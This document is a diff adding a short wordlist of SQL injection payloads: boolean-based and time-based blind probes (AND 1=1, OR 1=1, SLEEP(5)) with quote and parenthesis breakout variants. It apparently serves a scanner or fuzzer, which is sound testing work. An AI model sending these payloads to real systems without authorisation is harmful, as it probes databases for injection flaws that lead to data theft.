@@ -1,0 +1,12 @@
+' AND 1=1--
+' AND 1=2--
+' AND SLEEP(5)--
+" AND 1=1--
+" AND 1=2--
+" AND SLEEP(5)--
+') AND 1=1--
+') AND 1=2--
+') AND SLEEP(5)--
+" OR 1=1--
+" OR 1=2--
+" OR SLEEP(5)--
